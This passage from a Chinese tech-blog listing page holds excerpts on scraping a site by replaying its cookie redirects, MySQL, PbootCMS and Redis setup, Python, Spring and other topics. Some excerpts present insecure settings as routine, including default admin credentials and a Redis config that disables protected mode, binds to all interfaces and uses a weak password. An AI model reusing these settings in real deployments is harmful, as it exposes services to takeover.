		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		注意！！！！某XX网站逆向实例仅作为学习案例，禁止其他个人以及团体做谋利用途！！！ 第一步：分析页面和请求方式
此网站没有技巧的加密，仅是需要携带cookie和请求格式，因此本文主要进行分析重点的2次请求
第二步：请求页面并分析请求
可以看到出现了三次请求，前两次请求为302 重定向，第三次请求状态为200
第三步：分析第一次请求
可以看到第一次请求在响应headers 可以获得set-cookie，同时也可以看到第一次请求后被重定向到指定地址Location
第四步：分析第二次请求，注意！注意！注意！这步请求很重要
可以看到第二次请求使用的是第一次请求后响应的重定向网址（也就是第一次请求302响应得到的location）和cookie，这步很重要。
第一请求——&gt;302（重定向）——&gt;response.headers.Location和set-cookie
第二次请求(第一次请求的response.headers.Location)—&gt;302（重定向）——&gt;response.headers.Location （第二次请求后的重定向网址可以忽略，可以直接请求目标网址）
第五步：请求目标链接
可以看到报文头中携带了cookie和内容类型。注意这两个参数很重要。
第六步：上代码
# -*- coding:utf-8 -*- # @Time : 2023/12/6 12:01 # @Author: 水兵没月 # @File : 某网址-cookie.py # @Software: PyCharm import json import random import requests headers = { "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Accept-Encoding":"gzip, deflate", "Accept-Language":"zh-CN,zh;q=0.9", "Cache-Control":"no-cache", "Connection":"keep-alive", "Content-Type":"application/json", "Host":"XXX.XXX.XX.XXX:8081", "Pragma":"no-cache", "Upgrade-Insecure-Requests":"1", "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", } # 第一次请求 res = requests.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a7479392030ea762f13b4253335894fa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cb54f679d592c8f654d861b27df97e08/" rel="bookmark">
			学习mysql记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		环境: macbookpro m1
1. 安装mysql 使用苹果自带的包管理工具brew进行安装
1. brew install mysql (安装)
2. brew services start mysql (启动mysql服务)
1.1 如果提示zsh: mysql command not found, 终端执行以下命令 1. cd ~ (切到根目录)
2. vi .bash_profile (进入编辑文本页)
按i, 粘贴环境变量 Export PATH=$PATH:/usr/local/mysql/bin 如图所示 粘贴完毕按键盘左上角esc, 输入 :wq 回车
3. 重启终端即可
2. 默认mysql无密码 mysql -u root -p (连接mysql)
提示输入密码, 直接回车, 默认无密码
3. 数据库常用操作命令 mysql的命令对大小写不敏感
show databases // 显示所有数据库
use xxx // 选择xxx数据库
select database() // 查看当前使用的数据库
select table xxx // 选择xxx表
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cb54f679d592c8f654d861b27df97e08/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5613f9b80bb762f8ad2ec3db3f6f46e/" rel="bookmark">
			参数化单元测试 - 不能同时使用@RunWith(SpringRunner.class) 和 @RunWith(Parameterized.class)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		环境 SpringBoot：2.7.18，Junit：4.13.2
问题说明 Junit4 中，注入Spring上下文需要使用到@RunWith(SpringRunner.class)，参数化测试需要使用到@RunWith(Parameterized.class)，当单测的方法依赖Spring上下文，又想使用参数化测试时，只能使用一个@RunWith()，怎么办？
代码示例 Controller @RestController public class JunitController { @Autowired private JunitService junitService; @GetMapping("/n/{a}/{b}") public Integer getNumberType(@PathVariable Integer a, @PathVariable Integer b) { return junitService.determineNumberType(a, b); } } Service @Service public class JunitServiceImpl implements JunitService { // 两数相乘 @Override public Integer determineNumberType(Integer a, Integer b) { return a * b; } } DAO 如果有数据库需求，同理，按需定义即可。
单测示例（已解决 依赖注入，按照代码中提示，补全 5 个步骤即可
@Slf4j // 1、Junit 参数化测试 @RunWith(Parameterized.class) // 需要使用 Spring 容器中的依赖, 注明这是一个测试类 @SpringBootTest // 2、参数化测试时注入 Spring 上下文依赖需要这两个注解 @ContextConfiguration @TestExecutionListeners({DependencyInjectionTestExecutionListener.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a5613f9b80bb762f8ad2ec3db3f6f46e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a2c26d83affae4e2921a9cf395f4f88f/" rel="bookmark">
			pbootcms建站
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 pbootcms建站 一、下载pbootcms二、安装1、进入宝塔面在网站栏，新建站点，将该址里面文件清除保留htacess 和。user.inia再将下载的pbootcms上传至该地址。 三、修改关联数据库1、在根目录下/config打开database.php照如下修改这里我使用mysqli数据库。修改并使用自已创建的数据库。注意dbname要改为自已使用的数据库名。2、将下载文件里数据库文件\PbootCMS-V3.2.4\PbootCMS-3.X\static\backup\sql下的pbootcms_v324.sql上传完后导入到你创建使用的数据库中。 四、管理网站通过/admin.php admin 123456 进入管理后台. 五、参考资料 一、下载pbootcms https://www.pbootcms.com/ 首页下载
二、安装 1、进入宝塔面在网站栏，新建站点，将该址里面文件清除保留htacess 和。user.inia再将下载的pbootcms上传至该地址。 三、修改关联数据库 1、在根目录下/config打开database.php照如下修改这里我使用mysqli数据库。修改并使用自已创建的数据库。注意dbname要改为自已使用的数据库名。 2、将下载文件里数据库文件\PbootCMS-V3.2.4\PbootCMS-3.X\static\backup\sql下的pbootcms_v324.sql上传完后导入到你创建使用的数据库中。 四、管理网站 通过/admin.php admin 123456 进入管理后台. 五、参考资料 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/77b7dc0f28440354217c7776cf61db7d/" rel="bookmark">
			python多线程：不堵塞主线程&#43;子线程超时结束
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 import threading import time class LongTimeTool(threading.Thread): def __init__(self): threading.Thread.__init__(self) self.is_timeout = False def long_time_fun(self): print("long_time_fun start") # 模拟需要执行的耗时操作 while not self.is_timeout: print("我在运行") time.sleep(1) print("long_time_fun end") def async_fun(): # 创建线程并启动 thread = threading.Thread(target=async_fun_son) thread.start() time.sleep(1) return "返回response" def async_fun_son(): print("async_fun_son start") long_time_tool = LongTimeTool() thread_son = threading.Thread(target=long_time_tool.long_time_fun) thread_son.start() time.sleep(5) long_time_tool.is_timeout = True thread_son.join() print("async_fun_son end") if __name__ == '__main__': print("开始") print(async_fun()) time.sleep(20) print("结束") 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/75c1a45eb7342b2ca91a51da3572a649/" rel="bookmark">
			Python(四)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.字符串类型 1.按索引取值(正向取+反向取):只能取 str = 'hello world' # 正向取 print(str[0]) # 反向取 print(str[-1]) # 只能取,不能改 2.切片:索引的拓展应用，从一个大字符串中拷贝出一个子字符串(顾头不顾尾，步长) str = 'hello world' res = str[0:5] print(res) print(str) # 步长 res = str[0:5:2] print(res) # 反向步长 res = str[5:0:-1] print(res) # 长度len print(len(str)) # 成员运算in和not in # 判断一个子字符串是否存在于一个大字符穿 print('alex' in 'alex' is 'sb') print(not 'alex' in "alex is sb") # 不推荐使用 print('alex' not in "alex is sb") # 移除空白strip str = ' egon ' res = str.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/75c1a45eb7342b2ca91a51da3572a649/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/acbc5142b1e455ff0445096821b31280/" rel="bookmark">
			解锁无限可能性：探索Amazon Lightsail的便捷云计算服务
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		解锁无限可能性：探索Amazon Lightsail的便捷云计算服务 在数字化时代，云计算成为推动创新和业务发展的关键驱动力。Amazon Lightsail 作为 Amazon Web Services（亚马逊云科技）家族中的一员，为小型企业和创业公司提供了简便、强大的云计算服务。无论您是刚刚起步的初创公司，还是需要灵活而高效的云解决方案，Amazon Lightsail 都将是您业务成功的得力助手。
目录
目录
解锁无限可能性：探索Amazon Lightsail的便捷云计算服务
1.零基础，快速上手
2.成本可控，精打细算
3.安全可靠，数据无忧
4.全球部署，近在咫尺
5.专业支持，贴心服务
实验
先决条件
将容器镜像从本地机器推送到容器服务
查看存储在容器服务中的容器镜像
查看存储在容器服务中的容器镜像
有关容器服务的其他信息
结语
1.零基础，快速上手 Amazon Lightsail 的独特之处在于其简易的使用方式。对于不具备专业云计算知识的初学者而言，Amazon Lightail 提供了友好而直观的界面，您无需深入学习复杂的云架构，即可轻松搭建、运行和扩展您的应用程序。
不管是一个简单的网站、博客，还是一个复杂的应用程序，Amazon Lightsail 都能够满足您的需求。选择您所需的应用程序框架，比如 WordPress、Magento 或 Node.js，只需几个点击，即可启动您的应用程序。而通过轻松的管理控制台，您可以方便地监控和管理您的资源。免费试用，即时体验！先到先得
2.成本可控，精打细算 对于小型企业和创业公司而言，预算通常是一个关键的考虑因素。Amazon Lightsail 通过其简化的定价模型，为用户提供了可预测的费用结构。您可以根据自己的需求选择不同的套餐，不会受到复杂的计费模式的困扰。
而且，Amazon Lightsail 提供了一系列资源规格，您可以根据业务的变化随时升级或降级您的资源，确保您只支付您实际使用的服务。这种灵活性使您能够更好地应对市场的变化，不会因为过高的成本而束手束脚。
3.安全可靠，数据无忧 在云计算时代，数据安全是企业发展的关键环节。Amazon Lightsail 通过其多层次的安全措施，确保您的数据始终得到保护。Amazon Lightsail 提供了自动快照功能，您可以随时备份您的实例，以防止意外数据丢失。
此外，Amazon Lightsail 还通过网络防火墙、数据加密等手段，为您的应用程序提供了强大的安全保障。您可以放心专注于业务发展，而不必担心数据泄露或网络攻击的威胁。
4.全球部署，近在咫尺 无论您的用户在世界何处，Amazon Lightsail 都能够为您提供稳定、高效的服务。通过全球多个区域的数据中心，Amazon Lightsail 可以为您的应用程序提供低延迟、高带宽的访问体验。
而通过 Amazon Lightsail 的扩展性，您可以轻松将您的应用程序部署到多个区域，确保您的用户始终能够获得最佳的服务质量。这种全球化的部署方式有助于拓展您的业务，吸引更广泛的用户群体。
5.专业支持，贴心服务 作为亚马逊云科技的一部分，Amazon Lightsail 继承了亚马逊云科技卓越的客户服务传统。无论您是在资源配置、安全设置还是应用程序优化方面遇到问题，亚马逊云科技的支持团队都将及时为您提供帮助。
此外，Amazon Lightsail 还提供了丰富的文档和教程，帮助您更好地理解和利用云计算的各种功能。无论您是初学者还是有一定经验的开发者，都能够轻松掌握 Amazon Lightsail 的使用技巧。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/acbc5142b1e455ff0445096821b31280/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7f54f5c83f79138527b23ca3e199a063/" rel="bookmark">
			命名实体识别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景 一般仅仅提取一些关键的字段，例如名称，时间，组织，地点等。 可应用于关系抽取(二者之间的关系)，事件抽取(某人感兴趣的事件)，知识图谱，问答系统，机器翻译
模型 LSTM+CRF LSTM这种模型可以用来学习序列信息。CRF被用来做状态转移概率。
指标 Precision达到80%， Recall达到50%表明可以达标。
Precision:
P = T P T P + F P P=\frac{TP}{TP+FP} P=TP+FPTP​
Recall:
R = T P T P + F N R=\frac{TP}{TP+FN} R=TP+FNTP​
专业名词 O2O：线上到线下Online to Offline
POI： Point of interest
垂直搜索：针对某一个行业的专业搜索引擎。
UGC：用户原创内容
参考资料 美团命名实体识别：
https://zhuanlan.zhihu.com/p/163256192
https://blog.csdn.net/sunshinezhihuo/article/details/108234412
https://www.cnblogs.com/anai/p/11492956.html
https://blog.csdn.net/macanv/article/details/85684284
关于HMM，CRF， LSTM做实体识别的博客
https://www.lookfor404.com/%E5%91%BD%E5%90%8D%E5%AE%9E%E4%BD%93%E8%AF%86%E5%88%AB%E7%9A%84%E8%AF%AD%E6%96%99%E5%92%8C%E4%BB%A3%E7%A0%81/
https://mp.weixin.qq.com/s?__biz=MzA3NDIyMjM1NA==&amp;mid=2649036099&amp;idx=1&amp;sn=7671dfd7c4f748c3aa0d12f57956fabf&amp;chksm=8712ab3eb065222862a03a0f18ec62cce6a6a8166656a3477c7c2f492c9749b7b68b75679693&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1572016847231&amp;sharer_shareid=4fa659852096f33de8f023fd01576ab8&amp;key=68be3ae943e49b4fbb7838f992ea2e842c457074724db7168c475a4bf1116361daf0c2f626cc1f5f6b619c5fc9e1f9ec1e91ef29ab2a2bd3f89dcbcf96828cdd1b3ee44f788225091d6974746deedf1c&amp;ascene=1&amp;uin=OTk1NzUyMjg0&amp;devicetype=Windows+10&amp;version=62070152&amp;lang=zh_CN&amp;pass_ticket=6AIkBD91lXgG6tU+pIy+UhgTchkQRsROj4GqFT1Fs9vsp6i0wq/ljafTyMzMsw8O
https://www.pianshen.com/article/874512843/ （实体识别的一些应用）
为什么要基于预测模型做实体识别 https://tech.meituan.com/2020/07/23/ner-in-meituan-nlp.html
实战 https://zhuanlan.zhihu.com/p/88547918
NerCode 使用
参考资料 Li J, Sun A, Han J, et al.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7f54f5c83f79138527b23ca3e199a063/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/199f2625dc9d3f88927fb955c39207e0/" rel="bookmark">
			小记-使用pychram执行代码出现报错:RuntimeError: lost sys.stdout
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用pychram执行代码出现报错:RuntimeError: lost sys.stdout
答:pychram出现这个报错大多数是因为文件命名有问题。文件的命名与Python的标准库名一致，并且该命名在许多Python模块中都有输入。因此，当你的文件名与Python内置文件名一致时，就会报错
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fc56f60cf63de05b30614a40526a976f/" rel="bookmark">
			UNET和FCN的不同
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		FCN的优点和不足
与传统用CNN进行图像分割的方法相比，FCN有两大明显的优点：
一是可以接受任意大小的输入图像，而不用要求所有的训练图像和测试图像具有同样的尺寸。
二是更加高效，因为避免了由于使用像素块而带来的重复存储和计算卷积的问题。
同时FCN的缺点也比较明显：一是得到的结果还是不够精细。进行8倍上采样虽然比32倍的效果好了很多，但是上采样的结果还是比较模糊和平滑，对图像中的细节不敏感。二是对各个像素进行分类，没有充分考虑像素与像素之间的关系，忽略了在通常的基于像素分类的分割方法中使用的空间规整（spatial regularization）步骤，缺乏空间一致性。
Unet与FCN网络的区别
U-Net和FCN非常的相似，U-Net比FCN稍晚提出来，但都发表在2015年，和FCN相比，U-Net的第一个特点是完全对称，也就是左边和右边是很类似的，而FCN的decoder相对简单。
第二个区别就是skip connection，FCN用的是加操作（summation），U-Net用的是叠操作（concatenation）。这些都是细节，重点是它们的结构用了一个比较经典的思路，也就是编码和解码（encoder-decoder)结构。其实可以将图像-&gt;高语义feature map的过程看成编码器，高语义-&gt;像素级别的分类score map的过程看作解码器
此外, 由于UNet也和FCN一样, 是全卷积形式, 没有全连接层(即没有固定图的尺寸),所以容易适应很多输入尺寸大小,但并不是所有的尺寸都可以,需要根据网络结构决定。
为什么Unet在医疗图像分割中表现好
医疗影像语义较为简单、结构固定。因此语义信息相比自动驾驶等较为单一，因此并不需要去筛选过滤无用的信息。医疗影像的所有特征都很重要，因此低级特征和高级语义特征都很重要，所以U型结构的skip connection结构（特征拼接）更好派上用场
医学影像的数据较少，获取难度大，数据量可能只有几百甚至不到100，因此如果使用大型的网络例如DeepLabv3+等模型，很容易过拟合。大型网络的优点是更强的图像表述能力，而较为简单、数量少的医学影像并没有那么多的内容需要表述，因此也有人发现在小数量级中，分割的SOTA模型与轻量的Unet并没有优势
医学影像往往是多模态的。比方说ISLES脑梗竞赛中，官方提供了CBF，MTT，CBV等多中模态的数据（这一点听不懂也无妨）。因此医学影像任务中，往往需要自己设计网络去提取不同的模态特征，因此轻量结构简单的Unet可以有更大的操作空间。
Unet网络结构
Unet网络是建立在FCN网络基础上的，它的网络架构如下图所示，总体来说与FCN思路非常类似。这里需要注意的是，U-Net的输入大小是572x572，但是输出却是388x388，按理说它们应该相等（因为图像分割相当于逐像素进行分类，所以要求输入图像和输出图像大小一致），但是为什么这里的输入尺寸要比输出尺寸大呢？那是因为下图这个结构图是当年论文作者绘制的，该作者对输入图像的边缘进行了镜像填充，通过镜像填充将边界区域进行扩大，这样可以给模型提供更多信息来完成模型的分割。
按照论文中的解释，镜像填充的原因是：因为图像 的边界的外面是空白的，没有其它有效像素，而我们预测图像中的像素类别时往往需要参考它的周围像素作为上下文信息，这样才能保持分割的准确性，为了预测边界像素，论文对边界区域进行镜像，来补全边界周围缺失的内容，然后进行预测。这种策略叫做"overlap-tile"
这里的输入是单通道的原因是因为输入图片是灰度图，而输出是两通道是因为这里是对像素进行二分类（前景和背景），所以输出通道是2
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/836d35fb27dd92632cad876eb58e2960/" rel="bookmark">
			禁止ubuntu自动更新显卡驱动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		​使用 apt-mark hold命令
apt-mark hold命令可以帮助我们锁定软件包的版本，防止 Ubuntu 自动更新该软件。
具体操作步骤如下：
1. 打开终端，使用以下命令来查看当前安装的显卡驱动软件包：
dpkg -l | grep -i nvidia
2. 执行以下命令将该软件包的版本锁定：
sudo apt-mark hold &lt;package name&gt;
&lt;package name&gt; 表示需要锁定的显卡驱动版本号，例如：nvidia-driver-470。
sudo apt-mark hold nvidia-driver-470
3. 如果需要解除锁定，我们可以使用以下命令：
sudo apt-mark unhold &lt;package name&gt;
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/343893e9bf07ffb003c0e8befc3e4f43/" rel="bookmark">
			kuboard如何部署redis？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在K8S上部署redis 如 在K8S上部署mysql 所述，auth-server、user-center、api-gateway 都需要使用 redis 服务，本文描述如何使用 Kuboard 在 Kubernetes 上部署 redis。
本文将使用 redis官方镜像 进行部署。
部署redis 在 Kuboard 界面进入名称空间 （自己的命令空间），点击 创建工作负载 按钮，并填写表单，如下图所示：
字段名称填写内容工作负载类型有状态副本集（StatefulSet）工作负载分层持久层工作负载名称redis-dev副本数量1 基本信息 容器信息 字段名称填写内容名称redis容器镜像redis:7.2.0命令行参数redis-server /usr/local/etc/redis/redis.conf资源请求/限制内存资源请求200Mi 内存资源限制4000Mi容器端口6379 容器启动检查探针 字段名称填写内容类型Tcp连接端口号6379初始延迟（秒）30执行探测频率（秒）10超时时间（秒）1不健康阈值3 容器存活检查探针 字段名称填写内容类型Tcp连接端口号6379初始延迟（秒）20执行探测频率（秒）10超时时间（秒）1不健康阈值3 存储挂载 配置字典 dir /data #数目录 port 6379 #指定端口 bind 0.0.0.0 #允许外部访问 appendonly yes #开启持久化 protected-mode no requirepass 123qwe## #密码 高级设置 服务/应用路由 最后点击保存。
命令行配置文件如下 --- apiVersion: apps/v1 kind: StatefulSet metadata: annotations: {} labels: k8s.kuboard.cn/layer: db k8s.kuboard.cn/name: redis-dev name: redis-dev namespace: sca-dev resourceVersion: '311600' spec: podManagementPolicy: Parallel replicas: 1 revisionHistoryLimit: 10 selector: matchLabels: k8s.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/343893e9bf07ffb003c0e8befc3e4f43/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa32abcb07752ebe7cf40270b8efb08f/" rel="bookmark">
			腾讯混元大模型初体验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		相信很多粉丝朋友对chatgpt肯定不陌生，但是呢，他在国内的使用有一定的门槛，相信还是有不少朋友因此望而止步。没关系，咋们国内的ai产品也层出不穷，很多公司都陆陆续续的推出了自己的ai大模型，比如阿里的通义千问，百度的文心一言，字节的豆包等等，今天让我们一起来看一下小编最近新了解到的ai大模型：腾讯混元助手。
腾讯混元助手是腾讯开发的大语言模型，今年通过备案后，腾讯混元大模型也已经面向C端用户陆续开放体验，用户通过小程序或网页端，就能与腾讯混元对话。
网页端地址：https://hunyuan.tencent.com/ ，小程序端搜索“腾讯混元助手”即可。
场景一、代码生成能力
听说混元大模型的代码能力最近有较大幅度的提升，那接下来让我们通过一个简单的案例来体验一下他的能力。
下面我们先来介绍一下背景：
小编是一名测试人员，目前在测试的产品跟证券的业务有关，由于涉及到多个国家地区的业务，因此会涉及到多套测试环境的部署，这么多的测试环境+uat环境，脚本的同步批量执行+结构的对比就成了一个比较麻烦的事情。数据库的话都是用的mysql。
接下来让我们一起看一下混元大模型能否帮助我们去解决这个问题：(由于生成的都是以代码为主，中间过程就不记录完整的截图)
prompt1：我需要保持多态测试环境的mysql表结构一致，以及批量执行建表和加字段的脚本等，请问用python怎么实现。要求可以同时对多个环境执行脚本，并且数据库的信息和db文件要分别写在配置文件中，数据库配置文件中要支持给每个配置设置环境名称
虽然我强调db脚本文件要写在配置文件中，这里还没有放到文件里面去，没关系，接下来我再要求它改成db通过读取文件的方式获取
prompt2：db执行脚本要改成从文件中获取
通过这两个指令，基本上已经可以帮到我解决目前的这个场景，AI生成的脚本在调试的时候，可能会遇到两个问题：
1、db文件中可能会存在一些中文字符啥的，这个你可以再继续询问小助手，他会帮你解决。
2、一般我们执行db文件的话，文件中不可能只有一条sql语句 ，一般肯呢个存在多条，这个用脚本去执行的时候，ai生成的脚本一般都是直接一起执行，这个在执行的时候其实是会报错的，当你把错误信息发给ai之后，他只会让你去检查是否有语法错误啥的，并不会帮你去把sql脚本进行拆分执行。但是换一个方式去向他提问的时候，他会帮你把文件拆分为单条语句去执行：
总结：对于代码纠错这块的场景来说，与chatgpt对比没感到太大的区别 ，关键在于你怎么样向他去提问发送指令。这里有一点很重要：一条路行不通的时候，一定要尝试换一个思路去解决。当我发现脚本执行失败的时候，我发现不管是混元，还是gpt以及文心一言等，都只是会让你去检查sql有没有语法错误，哪怕我把完整的sql贴上去，他也是没办法帮我们去修正程序。虽然工具的出现给我们带来了很大的遍历，但是如何更有效的去利用工具才是关键。
针对上面的场景，其实可以再加一些prompt，让他将我们的代码更加完善，比如，执行脚本执行报错了需要跳过，继续执行后面的。每个环境脚本执行的结果需要记录下来。然后脚本执行完之后，可以自动帮我们去对比各个环境之间表结构的差异，如果有不一致的，可以帮我们输出结构同步的脚本。
场景二：用来解决工作中遇到的一些小问题
No1:开发昨天突然问我，jira有没有办法查询某个开发做过的单子
说实话，jira我之前都没用过，也就到了现在这个公司才开始接触，我用的多的JQL查询一般也就是查 经办人 = 自己，并且状态不是完成状态的单子进行监控，像这种经办人曾经是某个人的，我还不知道怎么去查
后面试了一下混元助手和gpt，发现他们都能帮我解决这个问题：
从上面两张图可以看出，小助手对上下文的理解能力还是可以的，第一个问题回答的基本就跑题了，当我再补充描述的时候，它立马就回答正确了。
No2：我之前没接触过es，然后最近测的业务需要查里面的数据 ，我就问ai我要怎么查数据:
从上面三张图可以发现 ，混元助手和gpt的回答都是差不多的，一下子就直接给出了我想要的回答，文心一言一上来就给我整的是代码的方式去查询，虽然也能实现，但确不是我一开始所期望的效果，得后面继续给它其他指令才能达到我的预期。
场景三：画图能力
画图的话，这里主要一起对比下文心一言VS混元模型
总结：初步体验了一下，我觉得在我的日常工作中，完全可以用腾讯的混元模型去代替gpt3.5去使用的，毕竟gpt的使用有一定的门槛，而且查的数据还不是很新，有诸多限制，腾讯的混元助手从响应速度、生成内容的准确性来看，目前都还不错，最重要的一点 ，反正目前还是可以免费使用体验咯~。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7834372d62cd5151d38c485d3768e1fb/" rel="bookmark">
			SpringBoot 统一登录鉴权、异常处理、数据格式 的正确姿势
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 统一用户登录权限效验 用户登录权限的发展完善过程
最初用户登录效验：在每个方法中获取 Session 和 Session 中的用户信息，如果存在用户，那么就认为登录成功了，否则就登录失败了
第二版用户登录效验：提供统一的方法，在每个需要验证的方法中调用统一的用户登录身份效验方法来判断
第三版用户登录效验：使用 Spring AOP 来统一进行用户登录效验
第四版用户登录效验：使用 Spring 拦截器来实现用户的统一登录验证
1.1 最初用户登录权限效验 @RestController @RequestMapping("/user") public class UserController { @RequestMapping("/a1") public Boolean login (HttpServletRequest request) { // 有 Session 就获取，没有就不创建 HttpSession session = request.getSession(false); if (session != null &amp;&amp; session.getAttribute("userinfo") != null) { // 说明已经登录，进行业务处理 return true; } else { // 未登录 return false; } } @RequestMapping("/a2") public Boolean login2 (HttpServletRequest request) { // 有 Session 就获取，没有就不创建 HttpSession session = request.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7834372d62cd5151d38c485d3768e1fb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca9b1a106f361b3f164cd5afe629184f/" rel="bookmark">
			解决：Docker中CentOS镜像的yum等安装问题bash: xxxx: command not found
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题背景：
1、
[root@0b6b7678467c xxx]# yum -y install vim Failed to set locale, defaulting to C.UTF-8 CentOS Linux 8 - AppStream 1.7 B/s | 38 B 00:21 Error: Failed to download metadata for repo 'appstream': Cannot prepare internal mirrorlist: No URLs in mirrorlist 2、
#执行一些man man或者vim的时候报错 bash: xxxx: command not found 解决方案：
1、ls /etc/yum.repos.d/
2、mv /etc/yum.repos.d/CentOS-Linux-BaseOS.repo /etc/yum.repos.d/CentOS-Linux-BaseOS.repo.backup
3、curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-vault-8.5.2111.repo
4、cat /etc/yum.repos.d/CentOS-Base.repo
复制这个文本的内容
5、vi /etc/yum.repos.d/CentOS-Linux-AppStream.repo
覆盖Appstream
6、yum clean all;yum makecache
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ca9b1a106f361b3f164cd5afe629184f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5d5b42de509d8de792f465364bb88caa/" rel="bookmark">
			卡码网语言基础课 | 19. 洗盘子
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、 栈的基本概念
二、 栈的操作
2.1 引入头文件
2.2 创建栈
2.3 栈的基本认识
三、 解答
通过本次练习，将学习到以下 C++知识点：
栈的基本概念（空栈、栈顶、栈底）和特点（先入后出）入栈、出栈、获取栈顶元素和判断栈是否为空栈等基本操作stack的定义和使用 题目描述：
假设你手里有一个盘子堆放区。现在需要模拟洗盘子的过程，每个盘子都有一个编号。 盘子堆放区操作说明： 1. 当操作为 1 时，表示从盘子堆放区拿走顶部的盘子清洗。
2. 当操作为 2 时，表示有未洗的盘子放入盘子堆放区。 在一系列操作之后，你需要回答：下一个清洗的盘子编号？
输入描述：
第一行有一个整数 n，代表初始盘子堆放区中盘子的数量为 n。 第二行有 n 个整数，代表了盘子的编号，同时整数之间的顺序也代表了未洗盘子加入盘子堆放区的顺序。 第三行为一个整数 m，代表接下来将会有 m 次操作。 接下来一共有 m 行，代表共有 m 次操作。 如果是操作 1，那么该行只会有一个数字 1，代表有一个盘子被拿走清洗。 如果是操作 2，那么该行有两个数字，第一个数字 2 表示有未洗的盘子加入，第二个数字代表未洗的盘子编号。
输出描述：
输出共一行，为下一个该清洗的盘子编号。 如果没有下一个该清洗的盘子，那么请输出 “All the dishes have been washed.”
一、 栈的基本概念 简单理解为：待清洗盘子来说是出栈，对于已清洗区域来说，是入栈（进栈）
栈这种结构只能在一侧（栈顶那一侧）进行插入和删除操作，而且是后进先出LIFO(后进入栈的元素离栈顶比较近，先出来)，允许进行插入和删除的那一端是栈顶，与之对应的另一端是栈底, 如果一个栈不包含任何元素，这个栈被称为空栈。
栈的应用：
在计算机领域，栈的应用也十分广泛，比如浏览器的历史回退和编写文档时的“撤销”操作。
二、 栈的操作 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5d5b42de509d8de792f465364bb88caa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac4cab9d1e71969904aa2f11df4c0eba/" rel="bookmark">
			Last Week in Milvus
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		What's New Milvus 社区开通了 Discord 交流频道 https://discord.com/invite/8uyFbECzPX
